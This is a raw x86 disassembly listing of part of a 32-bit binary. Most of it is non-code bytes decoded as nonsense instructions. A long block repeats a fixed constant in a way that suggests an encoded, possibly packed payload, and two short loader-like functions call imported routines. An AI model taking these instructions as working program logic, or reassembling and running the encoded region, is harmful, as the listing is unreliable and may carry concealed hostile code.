  422cb2:	mov    ebp,0x96e01ccf
  422cb7:	bswap  edi
  422cb9:	cdq    
  422cba:	add    al,0xdd
  422cbc:	adc    BYTE PTR [esi],0xd
  422cbf:	mov    ebx,0x16e1d54a
  422cc4:	mov    cl,0x14
  422cc6:	nop
  422cc7:	outs   dx,BYTE PTR ds:[esi]
  422cc8:	mov    dl,0xf3
  422cca:	jle    0x422c98
  422ccc:	jecxz  0x422d1f
  422cce:	js     0x422c9a
  422cd0:	adc    BYTE PTR [edx-0x7b],cl
  422cd3:	mov    bp,ss
  422cd6:	xor    ecx,ebx
  422cd8:	aaa    
  422cd9:	and    BYTE PTR [ebx+0x494ad546],dh
  422cdf:	mov    eax,0x574f4ec5
  422ce4:	sti    
  422ce5:	icebp  
  422ce6:	sahf   
  422ce7:	pop    es
  422ce8:	aaa    
  422ce9:	or     al,0x74
  422ceb:	mov    ds:0xd5f38af,al
  422cf0:	stc    
  422cf1:	cmc    
  422cf2:	into   
  422cf3:	icebp  
  422cf4:	ins    BYTE PTR es:[edi],dx
  422cf5:	(bad)  
  422cf6:	nop
  422cf7:	(bad)  
  422cf8:	sbb    edi,ebp
  422cfa:	cmp    eax,DWORD PTR ds:0x7522117b
  422d00:	repz jb 0x422d36
  422d03:	or     eax,0x90f741e6
  422d08:	mov    dh,bh
  422d0a:	ins    DWORD PTR es:[edi],dx
  422d0b:	xchg   ebx,eax
  422d0c:	aam    0x30
  422d0e:	nop
  422d0f:	out    dx,eax
  422d10:	mov    dh,0x39
  422d12:	ja     0x422d7f
  422d14:	ret    
  422d15:	xchg   edx,eax
  422d16:	mov    eax,0x624fe031
  422d1b:	leave  
  422d1c:	inc    eax
  422d1d:	scas   eax,DWORD PTR es:[edi]
  422d1e:	jnp    0x422cb0
  422d20:	push   ecx
  422d21:	sar    esp,0x5b
  422d24:	clc    
  422d25:	fs jo  0x422cb2
  422d28:	int    0x6
  422d2a:	mov    al,ds:0x1d89d95d
  422d2f:	aas    
  422d30:	mov    al,ds:0x5772add6
  422d35:	(bad)  
  422d36:	dec    ah
  422d38:	sti    
  422d39:	and    DWORD PTR [eax+0x3485ccde],esp
  422d3f:	pop    ecx
  422d40:	jge    0x422da2
  422d42:	(bad)  
  422d43:	fcom   QWORD PTR [edi+0x26]
  422d46:	pop    ebx
  422d47:	jmp    0xfb9e:0x82ef0eb1
  422d4e:	stos   DWORD PTR es:[edi],eax
  422d4f:	bound  edi,QWORD PTR [esi-0x426a59ce]
  422d55:	push   ss
  422d56:	push   cx
  422d58:	out    0x56,al
  422d5a:	outs   dx,BYTE PTR ds:[esi]
  422d5b:	jae    0x422db2
  422d5d:	div    DWORD PTR [ebx+0x2fbfe667]
  422d63:	or     cl,BYTE PTR [eax-0x5f95bb94]
  422d69:	jge    0x422cf7
  422d6b:	out    0x72,al
  422d6d:	jle    0x422db5
  422d6f:	fs inc esi
  422d71:	mov    bh,0xe8
  422d73:	xor    al,0x35
  422d75:	sbb    al,0x72
  422d77:	sar    BYTE PTR [ecx+0x4827941c],cl
  422d7d:	das    
  422d7e:	inc    eax
  422d7f:	pop    esi
  422d80:	mov    ds:0x7634228b,eax
  422d85:	fst    DWORD PTR [edi]
  422d87:	and    ecx,DWORD PTR [ebx-0x31]
  422d8a:	inc    esi
  422d8b:	pop    ss
  422d8c:	xchg   ebp,eax
  422d8d:	push   ebx
  422d8e:	add    DWORD PTR [edi+0x5a719f38],edi
  422d94:	jbe    0x422db1
  422d96:	(bad)  
  422d98:	int3   
  422d99:	es dec edi
  422d9b:	and    al,0x6d
  422d9d:	add    DWORD PTR [ebx-0x37],ebp
  422da0:	in     al,0xf3
  422da2:	sti    
  422da3:	retf   
  422da4:	dec    edx
  422da5:	shr    DWORD PTR [edx-0x49a69efd],cl
  422dab:	addr16 std 
  422dad:	pop    eax
  422dae:	lods   al,BYTE PTR ds:[esi]
  422daf:	jmp    0x3b0:0x7421ae21
  422db6:	(bad)  
  422db7:	cdq    
  422db8:	mov    eax,ds:0x188f70a5
  422dbd:	sbb    DWORD PTR [eax+0x4a],esi
  422dc0:	pushf  
  422dc1:	or     eax,0xc4889405
  422dc6:	loopne 0x422e23
  422dc8:	fbstp  TBYTE PTR [edi]
  422dca:	ins    DWORD PTR es:[edi],dx
  422dcb:	les    eax,FWORD PTR [ebx]
  422dcd:	outs   dx,BYTE PTR ds:[esi]
  422dce:	jp     0x422da4
  422dd0:	sbb    al,0x8b
  422dd2:	in     eax,dx
  422dd3:	dec    esp
  422dd4:	inc    ecx
  422dd5:	lds    esi,FWORD PTR [ebp-0x16]
  422dd8:	imul   eax,ebx,0xffffff8c
  422ddb:	out    dx,eax
  422ddc:	mov    cl,0x95
  422dde:	jb     0x422dce
  422de0:	cmp    al,0x33
  422de2:	lds    esp,FWORD PTR [ebx]
  422de4:	sbb    bl,BYTE PTR [ebx]
  422de6:	sti    
  422de7:	leave  
  422de8:	mov    ds:0xbe27fbf2,eax
  422ded:	sbb    BYTE PTR [esi+edx*2+0x2c],dh
  422df1:	inc    ebx
  422df2:	rol    DWORD PTR [ecx+0x32],0x86
  422df6:	dec    edx
  422df7:	push   edx
  422df8:	mov    BYTE PTR [esp+eiz*8],bh
  422dfb:	cmp    al,0x7f
  422dfd:	xor    bl,al
  422dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e00:	add    eax,edx
  422e02:	mov    edx,?
  422e04:	and    al,BYTE PTR [ebx]
  422e06:	push   esi
  422e07:	cld    
  422e08:	hlt    
  422e09:	out    dx,al
  422e0a:	or     BYTE PTR [edx+edx*2],dh
  422e0d:	les    ebp,FWORD PTR [edx-0x57f5ccf0]
  422e13:	aas    
  422e14:	cld    
  422e15:	jmp    0xdc3c:0x719755fa
  422e1c:	pop    edi
  422e1d:	into   
  422e1e:	mov    esi,0xf79c4ba2
  422e23:	mov    bl,0x8
  422e25:	iret   
  422e26:	dec    ebp
  422e27:	adc    BYTE PTR [ebx+0x4f7504da],dh
  422e2d:	scas   al,BYTE PTR es:[edi]
  422e2e:	dec    esp
  422e2f:	sub    DWORD PTR [ecx+0x3b84c5d0],ebp
  422e35:	xchg   esi,eax
  422e36:	into   
  422e37:	xlat   BYTE PTR ds:[bx]
  422e39:	cmp    dl,BYTE PTR [eax+0x335b3792]
  422e3f:	mov    ds:0x7de78e57,al
  422e44:	dec    eax
  422e45:	shl    DWORD PTR [ebx-0x2c],0x3c
  422e49:	(bad)  [ebx+ecx*8+0x34ca3146]
  422e50:	fistp  WORD PTR [ecx-0x6172d4b3]
  422e56:	adc    ecx,DWORD PTR [ecx]
  422e58:	(bad)  
  422e59:	fisub  WORD PTR [eax-0x77441607]
  422e5f:	cmp    cl,bl
  422e61:	add    ebp,DWORD PTR [esi]
  422e63:	sbb    eax,0xbefecd9c
  422e68:	nop
  422e69:	sub    al,0x7b
  422e6b:	les    esp,FWORD PTR [esi-0x64]
  422e6e:	xor    ebp,DWORD PTR [edx-0x70]
  422e71:	pop    ecx
  422e72:	ins    DWORD PTR es:[edi],dx
  422e73:	fcmovnb st,st(6)
  422e75:	popa   
  422e76:	sahf   
  422e77:	inc    esp
  422e78:	jo     0x422e1c
  422e7a:	dec    edx
  422e7b:	or     ah,BYTE PTR [ecx+ebp*8-0x16]
  422e7f:	shr    DWORD PTR [esp+edx*8+0x48458949],cl
  422e86:	imul   eax,ebp,0x5fb8da9
  422e8c:	(bad)  
  422e8d:	xor    eax,DWORD PTR [ecx]
  422e8f:	inc    ecx
  422e90:	sub    ah,BYTE PTR [ebx]
  422e92:	stos   DWORD PTR es:[edi],eax
  422e93:	mov    ecx,0xad0b3a42
  422e98:	test   edx,esi
  422e9a:	and    BYTE PTR [ebp-0x646142a9],0x6c
  422ea1:	call   0x30b1986d
  422ea6:	jns    0x422f1e
  422ea8:	mov    ds:0x6fe6beab,eax
  422ead:	cmp    al,0x11
  422eaf:	pop    es
  422eb0:	and    eax,0x6743cc0f
  422eb5:	lods   al,BYTE PTR ds:[esi]
  422eb6:	jmp    0x2b3b:0x42ba23a9
  422ebd:	loopne 0x422ed3
  422ebf:	sahf   
  422ec0:	push   cs
  422ec1:	push   ebp
  422ec2:	mov    ebp,?
  422ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec5:	pop    ecx
  422ec6:	fild   DWORD PTR [edx+0xa8ccb4d]
  422ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ecd:	scas   eax,DWORD PTR es:[edi]
  422ece:	mov    edx,0xd62857b9
  422ed3:	sbb    BYTE PTR [ecx],bh
  422ed5:	ss mov ecx,0x11579983
  422edb:	or     al,0x46
  422edd:	stc    
  422ede:	inc    edi
  422edf:	pop    ss
  422ee0:	imul   ebp,DWORD PTR [edx+eax*8-0xf],0xffffffdb
  422ee5:	and    ah,ah
  422ee7:	push   es
  422ee8:	(bad)
  422eeb:	sub    BYTE PTR [ebp+0x7ae3c0c],0x75
  422ef2:	fs in  al,0xb2
  422ef5:	les    ecx,FWORD PTR [eax]
  422ef7:	inc    edi
  422ef8:	call   0x2b770356
  422efd:	cli    
  422efe:	mov    ds:0xcecd6dd0,al
  422f03:	dec    eax
  422f04:	test   DWORD PTR [ebx+ebx*2-0x5f],ebp
  422f08:	cmc    
  422f09:	aas    
  422f0a:	fsub   DWORD PTR [edx]
  422f0c:	mov    DWORD PTR [ecx-0x3d],edi
  422f0f:	addr16 jo 0x422ea8
  422f12:	mov    ah,0xe9
  422f14:	popf   
  422f15:	xchg   ecx,eax
  422f16:	jmp    0x6081:0x6203a70e
  422f1d:	mov    eax,0x1
  422f22:	mov    esp,ebp
  422f24:	pop    ebp
  422f25:	ret    
  422f26:	int3   
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0x9090df9a
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	dec    DWORD PTR [eax-0x5cded8a1]
  422fc8:	shr    DWORD PTR [edx+0x671f51e1],1
  422fce:	imul   ebx,DWORD PTR [edx+edi*1+0x5],0xd1a099b7
  422fd6:	stos   BYTE PTR es:[edi],al
  422fd7:	loope  0x42302e
  422fd9:	pop    ds
  422fda:	sub    DWORD PTR [bp+di+0x5c5],esp
  422fdf:	mov    bh,0x21
  422fe1:	mov    al,ds:0x55e1aad1
  422fe6:	pop    ds
  422fe7:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  422ff0:	stos   BYTE PTR es:[edi],al
  422ff1:	loope  0x423048
  422ff3:	pop    ds
  422ff4:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  422ffd:	stos   BYTE PTR es:[edi],al
  422ffe:	loope  0x422fad
  423000:	pop    ds
  423001:	imul   ebp,DWORD PTR [di-0x4026],0xd81421b9
  42300a:	addr16 shr ch,0x1e
  42300e:	sub    esp,DWORD PTR [edx+eax*4+0x52de6d91]
  423015:	and    BYTE PTR [ecx+0x6d328ed8],0x6
  42301c:	add    al,0x83
  42301e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42301f:	(bad)  fs:[edi-0x31]
  423023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423024:	mov    al,BYTE PTR [ebx+0x1c153f30]
  42302a:	int    0xe5
  42302c:	ins    BYTE PTR es:[edi],dx
  42302d:	fld    DWORD PTR [ecx]
  42302f:	in     al,0x9e
  423031:	stc    
  423032:	sar    DWORD PTR [eax],0x70
  423035:	add    ecx,DWORD PTR [ecx*4+0x5bd08c8]
  42303c:	mov    al,ds:0x55e1aad1
  423041:	pop    ds
  423042:	outs   dx,BYTE PTR ds:[si]
  423044:	cmp    bh,BYTE PTR [ecx]
  423046:	pop    esp
  423047:	hlt    
  423048:	fnstenv [edx]
  42304a:	fucomi st,st(1)
  42304c:	sbb    edi,eax
  42304e:	adc    eax,0xcf319124
  423053:	pop    ebp
  423054:	shr    BYTE PTR ds:0x73528eaa,cl
  42305a:	pop    edi
  42305b:	inc    edi
  42305c:	add    dl,BYTE PTR [ecx-0x57]
  42305f:	pop    es
  423060:	std    
  423061:	and    eax,0x93b4f82b
  423066:	jmp    0x4230a5
  423068:	out    0xf5,eax
  42306a:	arpl   WORD PTR [edi+0x67bd3c4b],cx
  423070:	pop    eax
  423071:	inc    ebx
  423072:	mov    al,ds:0x6d0ed5ab
  423077:	and    ebx,DWORD PTR [ebx+0x57]
  42307a:	paddw  mm4,QWORD PTR [ecx+0x19f2dba1]
  423081:	(bad)  
  423082:	adc    eax,0xcf309124
  423087:	sub    eax,0x6eaab34e
  42308c:	jb     0x4230ef
  42308e:	pop    edi
  42308f:	push   edx
  423090:	lahf   
  423091:	sti    
  423092:	test   eax,0x2b8a609d
  423097:	test   al,0x29
  423099:	cmp    bl,ch
  42309b:	or     eax,0xe1636f7a
  4230a0:	cmp    eax,0xc579bd97
  4230a5:	fisub  WORD PTR [eax+0x6d8dada3]
  4230ab:	cmp    ecx,edx
  4230ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ae:	ins    DWORD PTR es:[edi],dx
  4230af:	hlt    
  4230b0:	fnstenv [edx]
  4230b2:	fld    TBYTE PTR [edx+0x671f55e1]
  4230b8:	imul   esp,DWORD PTR [ebx+0x21f255c5],0xe3ab9da0
  4230c2:	push   ebp
  4230c3:	repz test BYTE PTR [esi],dh
  4230c6:	in     al,dx
  4230c7:	lds    eax,FWORD PTR ds:0xd1a021b7
  4230cd:	stos   BYTE PTR es:[edi],al
  4230ce:	loope  0x423085
  4230d0:	pop    ds
  4230d1:	fs push 0xb70fc4a8
  4230d7:	and    DWORD PTR [ebp+edx*8-0x56],ecx
  4230db:	loope  0x42312e
  4230dd:	sbb    DWORD PTR [edi+0x69],esp
  4230e0:	mov    ds:0x9cb605c5,eax
  4230e5:	mov    al,ds:0x55f1aad1
  4230ea:	pop    ds
  4230eb:	imul   esp,DWORD PTR [bp+0x5c5],0xd1a060b7
  4230f4:	mov    edx,0x651f55e1
  4230f9:	imul   esp,DWORD PTR [ebx+0x21b605c0],0xe1aad1a0
  423103:	push   eax
  423104:	pop    ds
  423105:	imul   sp,WORD PTR [ebx+0x21b705c5],0xda20
  42310e:	stos   BYTE PTR es:[edi],al
  42310f:	loope  0x423162
  423111:	pop    ds
  423112:	addr16 aam 0x92
  423115:	rol    BYTE PTR ds:0x51a021b5,0xaa
  42311c:	loope  0x423163
  42311e:	pop    ds
  42311f:	addr16 jns 0x4230c5
  423122:	lds    eax,FWORD PTR ds:0xd1a031b7
  423128:	mov    edx,0x671f55e1
  42312d:	imul   esp,DWORD PTR [ebx+0x21b705d5],0xe1aad1a0
  423137:	push   ebp
  423138:	pop    ds
  423139:	imul   esp,DWORD PTR [bx],0x48b70eab
  423140:	mov    ds:0x65e1aad1,eax
  423145:	adc    al,0x67
  423147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423148:	sahf   
  423149:	lds    eax,FWORD PTR ds:0xd1a021b7
  42314f:	stos   BYTE PTR es:[edi],al
  423150:	loope  0x4231a7
  423152:	pop    ds
  423153:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42315c:	stos   BYTE PTR es:[edi],al
  42315d:	loope  0x4231b4
  42315f:	pop    ds
  423160:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423169:	stos   BYTE PTR es:[edi],al
  42316a:	loope  0x4231c1
  42316c:	pop    ds
  42316d:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423176:	stos   BYTE PTR es:[edi],al
  423177:	loope  0x4231ce
  423179:	pop    ds
  42317a:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423183:	stos   BYTE PTR es:[edi],al
  423184:	loope  0x4231db
  423186:	pop    ds
  423187:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423190:	stos   BYTE PTR es:[edi],al
  423191:	loope  0x4231e8
  423193:	pop    ds
  423194:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42319d:	stos   BYTE PTR es:[edi],al
  42319e:	loope  0x4231f5
  4231a0:	pop    ds
  4231a1:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4231aa:	stos   BYTE PTR es:[edi],al
  4231ab:	loope  0x423202
  4231ad:	pop    ds
  4231ae:	imul   esp,DWORD PTR [bp+di+0x5c5],0xa9c55599
  4231b7:	fsubrp st(1),st
  4231b9:	push   ebp
  4231ba:	pop    ds
  4231bb:	addr16 dec ecx
  4231bd:	test   al,0xc5
  4231bf:	add    eax,0xd1a021a7
  4231c4:	nop
  4231c5:	in     eax,0x55
  4231c7:	pop    ds
  4231c8:	arpl   WORD PTR [ecx-0x5d],bp
  4231cb:	xchg   ebp,eax
  4231cc:	inc    eax
  4231cd:	hlt    
  4231ce:	adc    esi,esp
  4231d0:	sahf   
  4231d1:	stos   BYTE PTR es:[edi],al
  4231d2:	loope  0x423229
  4231d4:	pop    ds
  4231d5:	imul   eax,DWORD PTR [bp+di+0x5c5],0xa2d20f57
  4231de:	fadd   DWORD PTR [edx+0x69671f55]
  4231e4:	repz lds eax,FWORD PTR ds:0xd1ab11b7
  4231eb:	stos   BYTE PTR es:[edi],al
  4231ec:	mov    cl,0x55
  4231ee:	pop    ds
  4231ef:	addr16 push edi
  4231f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231f2:	lds    eax,FWORD PTR ds:0xd1a021b7
  4231f8:	stos   BYTE PTR es:[edi],al
  4231f9:	loope  0x423250
  4231fb:	pop    ds
  4231fc:	imul   esp,DWORD PTR [bp+di+0x5e5],0xd1a0c1b7
  423205:	stos   BYTE PTR es:[edi],al
  423206:	loope  0x42325d
  423208:	pop    ds
  423209:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423212:	stos   BYTE PTR es:[edi],al
  423213:	loope  0x42326a
  423215:	pop    ds
  423216:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42321f:	stos   BYTE PTR es:[edi],al
  423220:	loope  0x423277
  423222:	pop    ds
  423223:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42322c:	stos   BYTE PTR es:[edi],al
  42322d:	loope  0x423284
  42322f:	pop    ds
  423230:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423239:	stos   BYTE PTR es:[edi],al
  42323a:	loope  0x423291
  42323c:	pop    ds
  42323d:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423246:	stos   BYTE PTR es:[edi],al
  423247:	loope  0x42329e
  423249:	pop    ds
  42324a:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423253:	stos   BYTE PTR es:[edi],al
  423254:	loope  0x4232ab
  423256:	pop    ds
  423257:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423260:	stos   BYTE PTR es:[edi],al
  423261:	loope  0x4232b8
  423263:	pop    ds
  423264:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42326d:	stos   BYTE PTR es:[edi],al
  42326e:	loope  0x4232c5
  423270:	pop    ds
  423271:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42327a:	stos   BYTE PTR es:[edi],al
  42327b:	loope  0x4232d2
  42327d:	pop    ds
  42327e:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423287:	stos   BYTE PTR es:[edi],al
  423288:	loope  0x4232df
  42328a:	pop    ds
  42328b:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423294:	stos   BYTE PTR es:[edi],al
  423295:	loope  0x4232ec
  423297:	pop    ds
  423298:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232a1:	stos   BYTE PTR es:[edi],al
  4232a2:	loope  0x4232f9
  4232a4:	pop    ds
  4232a5:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232ae:	stos   BYTE PTR es:[edi],al
  4232af:	loope  0x423306
  4232b1:	pop    ds
  4232b2:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232bb:	stos   BYTE PTR es:[edi],al
  4232bc:	loope  0x423313
  4232be:	pop    ds
  4232bf:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232c8:	stos   BYTE PTR es:[edi],al
  4232c9:	loope  0x423320
  4232cb:	pop    ds
  4232cc:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232d5:	stos   BYTE PTR es:[edi],al
  4232d6:	loope  0x42332d
  4232d8:	pop    ds
  4232d9:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232e2:	stos   BYTE PTR es:[edi],al
  4232e3:	loope  0x42333a
  4232e5:	pop    ds
  4232e6:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232ef:	stos   BYTE PTR es:[edi],al
  4232f0:	loope  0x423347
  4232f2:	pop    ds
  4232f3:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4232fc:	stos   BYTE PTR es:[edi],al
  4232fd:	loope  0x423354
  4232ff:	pop    ds
  423300:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423309:	stos   BYTE PTR es:[edi],al
  42330a:	loope  0x423361
  42330c:	pop    ds
  42330d:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423316:	stos   BYTE PTR es:[edi],al
  423317:	loope  0x42336e
  423319:	pop    ds
  42331a:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423323:	stos   BYTE PTR es:[edi],al
  423324:	loope  0x42337b
  423326:	pop    ds
  423327:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423330:	stos   BYTE PTR es:[edi],al
  423331:	loope  0x423388
  423333:	pop    ds
  423334:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42333d:	stos   BYTE PTR es:[edi],al
  42333e:	loope  0x423395
  423340:	pop    ds
  423341:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42334a:	stos   BYTE PTR es:[edi],al
  42334b:	loope  0x4233a2
  42334d:	pop    ds
  42334e:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423357:	stos   BYTE PTR es:[edi],al
  423358:	loope  0x4233af
  42335a:	pop    ds
  42335b:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423364:	stos   BYTE PTR es:[edi],al
  423365:	loope  0x4233bc
  423367:	pop    ds
  423368:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423371:	stos   BYTE PTR es:[edi],al
  423372:	loope  0x4233c9
  423374:	pop    ds
  423375:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42337e:	stos   BYTE PTR es:[edi],al
  42337f:	loope  0x4233d6
  423381:	pop    ds
  423382:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  42338b:	stos   BYTE PTR es:[edi],al
  42338c:	loope  0x4233e3
  42338e:	pop    ds
  42338f:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  423398:	stos   BYTE PTR es:[edi],al
  423399:	loope  0x4233f0
  42339b:	pop    ds
  42339c:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4233a5:	stos   BYTE PTR es:[edi],al
  4233a6:	loope  0x4233fd
  4233a8:	pop    ds
  4233a9:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4233b2:	stos   BYTE PTR es:[edi],al
  4233b3:	loope  0x42340a
  4233b5:	pop    ds
  4233b6:	imul   esp,DWORD PTR [bp+di+0x5c5],0xd1a021b7
  4233bf:	stos   BYTE PTR es:[edi],al
  4233c0:	loope  0x423417
  4233c2:	pop    ds
  4233c3:	and    BYTE PTR [edi-0x48d53a57],al
  4233c9:	and    DWORD PTR [eax-0x834552f],esi
  4233cf:	lds    edx,FWORD PTR [esi]
  4233d1:	subps  xmm5,xmm0
  4233d4:	fwait
  4233d5:	xor    BYTE PTR [ecx+0x4d],dh
  4233d8:	out    0x42,eax
  4233da:	repnz loope 0x423367
  4233dd:	add    DWORD PTR [eax],ebx
  4233df:	daa    
  4233e0:	lahf   
  4233e1:	push   ss
  4233e2:	push   es
  4233e3:	xchg   esi,eax
  4233e4:	mov    dh,0xbc
  4233e6:	dec    esi
  4233e7:	imul   edx,esp,0xffffffd9
  4233ea:	dec    ecx
  4233eb:	or     esi,DWORD PTR [ebx]
  4233ed:	cli    
  4233ee:	cmp    al,0x84
  4233f0:	outs   dx,BYTE PTR ds:[esi]
  4233f1:	adc    esi,eax
  4233f3:	mov    cl,ah
  4233f5:	jb     0x4233af
  4233f7:	out    dx,eax
  4233f8:	cmp    al,0xf2
  4233fa:	test   al,0xac
  4233fc:	test   DWORD PTR [edi*2+0x45811bc5],ebx
  423403:	inc    esp
  423404:	inc    ecx
  423405:	js     0x423453
  423407:	lods   al,BYTE PTR ds:[esi]
  423408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423409:	fcmovnb st,st(6)
  42340b:	sbb    bh,ch
  42340d:	ins    DWORD PTR es:[edi],dx
  42340e:	ins    BYTE PTR es:[edi],dx
  42340f:	add    ecx,esp
  423411:	push   ecx
  423412:	sbb    DWORD PTR [esi+0x5c],ebp
  423415:	pop    es
  423416:	pop    ss
  423417:	call   0xdf157ac0
  42341c:	dec    ecx
  42341d:	push   0x7a
  42341f:	fmul   DWORD PTR ds:0x666f9e12
  423425:	jmp    0xeda5:0x39ece3dd
  42342c:	fs jmp 0x42346a
  42342f:	jecxz  0x423471
  423431:	sbb    al,0xaa
  423433:	mov    ah,0xfc
  423435:	push   edi
  423436:	xchg   esi,eax
  423437:	and    DWORD PTR [edi+0x468e7509],0x149c353
  423441:	loope  0x4234a5
  423443:	lea    esi,[edi+eax*8]
  423446:	ins    DWORD PTR es:[edi],dx
  423447:	dec    eax
  423448:	dec    esi
  423449:	fwait
  42344a:	repz ret 
  42344c:	ja     0x4233f1
  42344e:	mov    esi,esp
  423450:	js     0x42341e
  423452:	mov    bh,0x48
  423454:	(bad)  
  423455:	lahf   
  423456:	dec    ebp
  423457:	mov    DWORD PTR [eax+0x23],esi
  42345a:	sbb    eax,0x1dbe35e9
  42345f:	(bad)  
  423460:	mov    bl,0x69
  423462:	pop    es
  423463:	push   ebp
  423464:	call   0xb19c:0x9167ee07
  42346b:	(bad)  
  42346d:	in     al,dx
  42346e:	repz pop ebx
  423470:	test   WORD PTR [edx],cx
  423473:	adc    DWORD PTR [esi],esp
  423475:	inc    ebp
  423476:	sbb    al,0xac
  423478:	clc    
  423479:	xchg   esp,eax
  42347a:	out    0x68,eax
  42347c:	lahf   
  42347d:	ins    DWORD PTR es:[edi],dx
  42347e:	call   0xd3a6:0x242ba44b
  423485:	xchg   DWORD PTR [ebp-0x9],ebx
  423488:	push   ebp
  423489:	int3   
  42348a:	sbb    DWORD PTR [esi],0x28
  42348d:	jne    0x4234ae
  42348f:	or     DWORD PTR [esi-0x7b],eax
  423492:	retf   
  423493:	jns    0x423461
  423495:	sbb    DWORD PTR [edi],0x941d6cdd
  42349b:	jecxz  0x4234e3
  42349d:	and    ch,0x70
  4234a0:	jbe    0x42342d
  4234a2:	mov    esi,0x736351be
  4234a7:	xor    esp,edi
  4234a9:	cmp    bl,al
  4234ab:	pop    es
  4234ac:	mov    bl,ah
  4234ae:	mov    ds:0xf0de6370,al
  4234b3:	or     bh,bl
  4234b5:	inc    edx
  4234b6:	outs   dx,BYTE PTR ds:[esi]
  4234b7:	push   ebx
  4234b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b9:	mov    bh,0xd5
  4234bb:	mov    dl,0x1f
  4234bd:	(bad)  
  4234be:	pop    esi
  4234bf:	aam    0x72
  4234c1:	sbb    edx,edi
  4234c3:	sub    ebp,DWORD PTR [edi+0x770486ca]
  4234c9:	faddp  st(6),st
